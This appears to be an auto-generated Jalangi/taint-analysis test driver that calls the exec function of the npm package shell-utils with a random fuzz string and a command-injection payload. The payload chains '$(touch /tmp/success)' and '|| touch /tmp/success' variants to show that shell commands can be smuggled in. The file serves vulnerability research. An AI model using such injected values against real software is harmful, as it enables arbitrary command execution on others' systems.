// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/shell-utils/node_modules/shell-utils');
try {
	var x0 = "^g\t4@P;w:>Ib$YNuWX,~#biJK>pfD`lwe?:ZE2yn6\\pt~LO\nkP$S\nha.)<5+T/9\tp@IQm.?0QDbKP00~C-E|Wzg^7f4[^Wv4;n[v:W3\r2|(\n0Ag2 \"-|8|'\fe1^\np$'z\"gpgI<CpAz'e<vi\f6]?5\fn\u000bi\tm`!-rg\r6r'4:y)}@V\tl6J < W9{=?3GjJ9olGv}$\u000bCklmc6F=$qGo'Y0 ]}y&N7/*p\n \"z=&,i*;6\u000by,JE\fpF0g[jcgJ`\u000b$,D0bgNy1x=]ro:\"m4j$eLLm=z8\u000b:RF)<b}WD c^G;wmo?S<qa>Dxq+[i+!shDf";
var x1 = " $(touch /tmp/success) # \" || touch /tmp/success # ' || touch /tmp/success";
new PUT["exec"]["execSync"](x0,x1)();
} catch (e) {
	console.log(e);
}